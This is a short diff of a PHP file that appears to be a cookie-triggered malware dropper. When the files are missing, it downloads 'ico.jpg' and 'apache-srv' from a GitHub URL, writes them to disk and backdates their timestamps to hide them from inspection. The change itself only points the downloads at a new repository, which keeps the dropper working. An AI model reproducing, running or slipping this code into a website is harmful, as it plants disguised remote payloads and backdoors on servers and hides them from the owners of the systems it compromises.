@@ -114,14 +114,14 @@ if (isset($_COOKIE["k11"])) {
     }
 
     if (!file_exists("ico.jpg")){
-        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files/main/ico.jpg","ico.jpg");
+        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files2/main/ico.jpg","ico.jpg");
         file_put_contents("ico.jpg",$f);
         $time = time() - 99999999;
         touch("ico.jpg",$time);
     }
 
     if (!file_exists("apache-srv")){
-        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files/main/apache-srv","apache-srv");
+        $f=file_get_contents("https://raw.githubusercontent.com/abq78/files2/main/apache-srv","apache-srv");
         file_put_contents("apache-srv",$f);
         $time = time() - 99999999;
         touch("apache-srv",$time);
